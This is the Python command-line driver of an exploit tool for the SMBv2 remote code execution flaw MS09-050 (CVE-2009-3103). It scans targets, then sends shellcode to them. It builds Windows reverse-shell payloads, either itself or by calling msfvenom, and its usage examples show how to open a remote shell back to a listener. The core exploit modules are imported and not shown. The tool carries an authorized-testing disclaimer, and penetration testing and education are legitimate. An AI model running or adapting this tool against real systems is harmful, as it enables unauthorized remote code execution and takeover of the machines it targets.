#!/usr/bin/env python3

import argparse
import os
import shutil
import subprocess
import sys

from lib.output import BANNER, info, success, error, warning, fatal
from lib.scanner import scan_target, print_scan_results
from lib.payloads import generate_reverse_shell
from lib.exploit import send_exploit


def load_shellcode_file(path):
    if not os.path.isfile(path):
        fatal(f"Shellcode file not found: {path}")

    with open(path, "rb") as f:
        shellcode = f.read()

    if not shellcode:
        fatal("Shellcode file is empty")

    success(f"Shellcode loaded from {path}: {len(shellcode)} bytes")
    return shellcode


def generate_msfvenom(lhost, lport, arch):
    if not shutil.which("msfvenom"):
        fatal("msfvenom not found in PATH, use --payload or -s instead")

    payload_map = {
        "x86": "windows/shell_reverse_tcp",
        "x64": "windows/x64/shell_reverse_tcp",
    }

    payload = payload_map[arch]
    info(f"Generating shellcode with msfvenom ({payload})")
    info(f"LHOST={lhost} LPORT={lport} ARCH={arch}")

    cmd = [
        "msfvenom",
        "-p", payload,
        f"LHOST={lhost}",
        f"LPORT={lport}",
        "EXITFUNC=thread",
        "-f", "raw",
        "--quiet",
    ]

    try:
        result = subprocess.run(cmd, capture_output=True, timeout=30)
    except subprocess.TimeoutExpired:
        fatal("msfvenom timed out")

    if result.returncode != 0:
        fatal(f"msfvenom failed: {result.stderr.decode(errors='replace').strip()}")

    shellcode = result.stdout
    if not shellcode:
        fatal("msfvenom produced empty output")

    success(f"Shellcode generated: {len(shellcode)} bytes")
    return shellcode


def parse_args():
    parser = argparse.ArgumentParser(
        prog="MS09.py",
        description="MS09-050 SMBv2 Remote Code Execution Exploit (CVE-2009-3103)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
modes:
  scan       Scan target for vulnerability and detect architecture
  exploit    Send exploit to target

payload options (exploit mode):
  --payload          Built-in reverse shell (no Metasploit needed)
  --msfvenom         Generate shellcode with msfvenom
  -s/--shellcode     Load raw shellcode from file

examples:
  Scan only:
    %(prog)s scan -t 192.168.1.10

  Exploit with built-in payload (auto-detect arch):
    %(prog)s exploit -t 192.168.1.10 --payload -l 10.0.0.5 -p 4444

  Exploit with built-in payload (manual arch):
    %(prog)s exploit -t 192.168.1.10 --payload -l 10.0.0.5 -p 4444 -a x64

  Exploit with msfvenom:
    %(prog)s exploit -t 192.168.1.10 --msfvenom -l 10.0.0.5 -p 4444

  Exploit with custom shellcode file:
    %(prog)s exploit -t 192.168.1.10 -s shellcode.bin -a x86

disclaimer:
  This tool is intended for authorized penetration testing and educational
  purposes only. Unauthorized access to computer systems is illegal.
  The author assumes no liability for misuse of this software.
        """,
    )

    subparsers = parser.add_subparsers(dest="mode", help="Operation mode")

    scan_parser = subparsers.add_parser("scan", help="Scan target for MS09-050 vulnerability")
    scan_parser.add_argument("-t", "--target", required=True, help="Target IP address")
    scan_parser.add_argument("-P", "--port", type=int, default=445, help="SMB port (default: 445)")

    exploit_parser = subparsers.add_parser("exploit", help="Send exploit to target")
    exploit_parser.add_argument("-t", "--target", required=True, help="Target IP address")
    exploit_parser.add_argument("-P", "--port", type=int, default=445, help="SMB port (default: 445)")
    exploit_parser.add_argument(
        "-a", "--arch", choices=["x86", "x64"], default=None,
        help="Target architecture (auto-detected if omitted)",
    )

    sc_group = exploit_parser.add_mutually_exclusive_group(required=True)
    sc_group.add_argument("--payload", action="store_true", help="Built-in reverse shell (no Metasploit needed)")
    sc_group.add_argument("--msfvenom", action="store_true", help="Generate shellcode with msfvenom")
    sc_group.add_argument("-s", "--shellcode", metavar="FILE", help="Path to raw shellcode file")

    exploit_parser.add_argument("-l", "--lhost", help="Listener IP address")
    exploit_parser.add_argument("-p", "--lport", type=int, help="Listener port")

    args = parser.parse_args()

    if not args.mode:
        parser.print_help()
        sys.exit(0)

    if args.mode == "exploit" and (args.payload or args.msfvenom):
        if not args.lhost or not args.lport:
            exploit_parser.error("--payload and --msfvenom require -l/--lhost and -p/--lport")

    return args


def run_scan(args):
    result = scan_target(args.target, args.port)
    print()
    print_scan_results(result, args.target)
    return result


def run_exploit(args):
    arch = args.arch

    if not arch:
        info("Architecture not specified, scanning target to auto-detect...")
        scan_result = scan_target(args.target, args.port)
        print()

        if scan_result["arch"]:
            arch = scan_result["arch"]
            success(f"Auto-detected architecture: {arch}")
        else:
            warning("Could not auto-detect architecture, defaulting to x86")
            arch = "x86"

        if scan_result["vulnerable"] is False:
            warning("Target does not appear vulnerable, proceeding anyway")
        print()

    if args.payload:
        shellcode = generate_reverse_shell(args.lhost, args.lport, arch)
    elif args.msfvenom:
        shellcode = generate_msfvenom(args.lhost, args.lport, arch)
    else:
        shellcode = load_shellcode_file(args.shellcode)

    send_exploit(args.target, shellcode, arch, args.port)


def main():
    print(BANNER)
    args = parse_args()

    if args.mode == "scan":
        run_scan(args)
    elif args.mode == "exploit":
        run_exploit(args)


if __name__ == "__main__":
    main()
